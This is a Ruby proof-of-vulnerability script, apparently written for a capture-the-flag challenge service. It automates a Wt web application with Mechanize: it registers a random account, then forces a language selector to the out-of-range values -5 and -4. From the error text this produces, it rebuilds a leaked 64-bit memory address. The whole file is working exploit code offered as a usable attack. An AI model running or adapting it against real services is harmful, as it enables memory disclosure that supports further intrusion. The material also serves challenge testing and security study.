#!/bin/env ruby

require "logger"

require 'securerandom'

require "mechanize"

LLL = Logger.new(STDERR,
                 formatter: proc do |sev, datetime, progname, msg|
                   "#{sev}: #{msg}\n"
                 end)

MAX_PIN =  0xffffffffffffffff

class Pov
  attr_reader :host, :port


  def initialize
    @host = ENV['HOST'] || 'challenge'
    @port = ENV['PORT'] || '3035'
  end

  def run!
    @username = "pov_quarley #{rand 1_000_000}"
    @password = "#{rand(26**10).to_s(26)} #{rand 1_000_000}"

    Mechanize.start do |agent|
      agent.log = LLL
      agent.follow_redirect = true

      index = agent.get "http://#{@host}:#{@port}"
      real_index = agent.click index.link_with text: 'Load basic HTML'
      fm = real_index.form_with id: 'form'

      reg_text = real_index.css('span[data-object-name="register"]').first
      reg_btn = reg_text.parent
      reg_page = fm.click_button fm.button_with(name: reg_btn['name'])
      fm = reg_page.form_with id: 'form'
      popup = reg_page.css('.Wt-auth-registration')
      fm.field_with(name: object_name(popup, 'user-name')).value = @username
      fm.field_with(name: object_name(popup, 'choose-password')).value = @password
      fm.field_with(name: object_name(popup, 'repeat-password')).value = @password
      did_reg_page = 
        fm.click_button fm.button_with(name: object_name(popup, 'ok-button'))

      puts did_reg_page.body

      fm = did_reg_page.form_with id: 'form'
      lang_selector = fm.field_with(css: 'select')
      become lang_selector.options.first, '-5'
      lang_selector.value = '-5'
      game_start_btn = fm.button_with(css: '.gamestack>div>button')
      assert_equal 'New game', game_start_btn.node.text
      did_first_page = fm.click_button game_start_btn

      first_fail = did_first_page.css('.gamestack span').first.text
      p first_fail

      
      fm = did_reg_page.form_with id: 'form'
      lang_selector = fm.field_with(css: 'select')
      become lang_selector.options.first, '-4'
      lang_selector.value = '-4'
      game_start_btn = fm.button_with(css: '.gamestack>div>button')
      assert_equal 'New game', game_start_btn.node.text
      did_first_page = fm.click_button game_start_btn

      second_fail = did_first_page.css('.gamestack span').first.text
      p second_fail

      first_chunk = /\d+/.match(first_fail)[0].to_i
      second_chunk = /\d+/.match(second_fail)[0].to_i

      addr = ((first_chunk << 32) | second_chunk)

      puts "ADDRESS=#{addr.to_s(16)}"
    end
  end

  private

  def become(option, value)
    option.instance_variable_set :@value, value
  end

  def object_name(parent, obj_name)
    coll = parent.css("[data-object-name=\"#{obj_name}\"]")
    
    if coll.empty?
      puts parent.to_html
      fail "Couldn't find `data-object-name` #{obj_name}"
    end

    coll.first['name']
  end

  def assert_equal(expected, actual)
    assert(expected == actual, "expected #{expected} to == #{actual}")
  end

  def assert(predicate, message='failed assertion')
    return if predicate
    fail message
  end
end

pov = Pov.new
at_exit do
  LLL.info((["ruby", $0] + ARGV).join(' '))
end
pov.run!

LLL.info "success :)"
